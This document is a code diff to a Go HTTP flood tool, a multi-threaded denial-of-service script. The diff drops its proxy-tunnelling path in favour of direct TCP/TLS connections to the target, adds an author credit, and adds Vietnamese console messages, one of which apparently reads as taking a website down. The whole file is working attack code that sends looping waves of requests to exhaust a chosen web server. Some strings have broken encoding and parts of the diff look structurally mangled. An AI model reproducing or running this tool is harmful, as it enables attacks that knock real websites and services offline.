@@ -1,3 +1,13 @@
+/*
+Coded by Nickyz9400
+Please fking code ur script by ur self, kid.
+
+I changed the random integers range to the max of int32.
+Now 386 systems should work well.
+
+Looks like most people want to hit the url but not the host/ip.
+As a result, here you are.
+*/
 package main
 
 import (
@@ -118,7 +128,6 @@ func contain(char string, x string) int { //simple compare
 }
 
 func flood() {
-	proxyAddr := "127.0.0.1:8080"
 	addr := host + ":" + port
 	header := ""
 	if mode == "get" {
@@ -178,41 +187,17 @@ func flood() {
 	var err error
 	<-start //received signal
 	for {
-		s, err = net.Dial("tcp", proxyAddr)
-		if err != nil {
-			fmt.Println("代理连接失败:", err)
-			continue
-		}
-		connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", addr, addr)
-		s.Write([]byte(connectReq))
-		
-		// 读取代理响应（应返回"HTTP/1.1 200 Connection established"）
-		buf := make([]byte, 1024)
-		n, _ := s.Read(buf)
-		if !strings.Contains(string(buf[:n]), "200") {
-			s.Close()
-			continue
-		}
-		
-		// 在隧道上建立TLS连接
-		cfg := &tls.Config{
-			InsecureSkipVerify: true,
-			ServerName:         host,
-		}
-		s = tls.Client(s, cfg)
-			
-		} else {
-			s, err = net.Dial("tcp", proxyAddr)
-			if err != nil {
-				fmt.Println("代理连接失败:", err)
-				continue
+		if port == "443" {
+			cfg := &tls.Config{
+				InsecureSkipVerify: true,
+				ServerName:         host, //simple fix
 			}
-			// 修改请求行，包含完整URL（例如 GET http://example.com/ HTTP/1.1）
-			request := fmt.Sprintf("GET http://%s%s HTTP/1.1\r\n", addr, page) + header
-			s.Write([]byte(request))
+			s, err = tls.Dial("tcp", addr, cfg)
+		} else {
+			s, err = net.Dial("tcp", addr)
 		}
 		if err != nil {
-			fmt.Println("By Nickyz9400!!!") //When showing this message, it means ur ip got blocked or the target server down.
+			fmt.Println("Ðang Ð?t WEBSITE By Nickyz9400!!!") //When showing this message, it means ur ip got blocked or the target server down.
 		} else {
 			for i := 0; i < 100; i++ {
 				request := ""
@@ -283,11 +268,11 @@ func main() {
 	for i := 0; i < threads; i++ {
 		time.Sleep(time.Microsecond * 100)
 		go flood() // Start threads
-		fmt.Printf("\rThreads dd", float64(i+1))
+		fmt.Printf("\rThreads [%.0f] Ðã s?n sàng", float64(i+1))
 		os.Stdout.Sync()
 		//time.Sleep( time.Millisecond * 1)
 	}
-	fmt.Printf("ddcd")
+	fmt.Printf("\nB?m [Enter] Ð? Ti?p T?c")
 	_, err = input.ReadString('\n')
 	if err != nil {
 		fmt.Println(err)
